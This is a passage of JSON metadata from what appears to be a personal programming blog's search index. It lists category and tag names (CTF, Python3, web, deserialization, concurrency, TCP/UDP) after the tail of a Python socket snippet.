&#x27;,data.decode(&quot;UTF-8&quot;))client.close()","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"TCP","slug":"TCP","permalink":"https://xin02.github.io/tags/TCP/"},{"name":"UDP","slug":"UDP","permalink":"https://xin02.github.io/tags/UDP/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://xin02.github.io/categories/CTF/"},{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://xin02.github.io/tags/WEB/"},{"name":"反序列化","slug":"反序列化","permalink":"https://xin02.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"面向对象","slug":"面向对象","permalink":"https://xin02.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://xin02.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"协程","slug":"协程","permalink":"https://xin02.github.io/tags/%E5%8D%8F%E7%A8%8B/"},{"name":"多进程","slug":"多进程","permalink":"https://xin02.github.io/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"},{"name":"队列","slug":"队列","permalink":"https://xin02.github.io/tags/%E9%98%9F%E5%88%97/"},{"name":"进程池","slug":"进程池","permalink":"https://xin02.github.io/tags/%E8%BF%9B%E7%A8%8B%E6%B1%A0/"},{"name":"多线程","slug":"多线程","permalink":"https://xin02.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"互斥锁","slug":"互斥锁","permalink":"https://xin02.github.io/tags/%E4%BA%92%E6%96%A5%E9%94%81/"},{"name":"TCP","slug":"TCP","permalink":"https://xin02.github.io/tags/TCP/"},{"name":"UDP","slug":"UDP","permalink":"https://xin02.github.io/tags/UDP/"}]}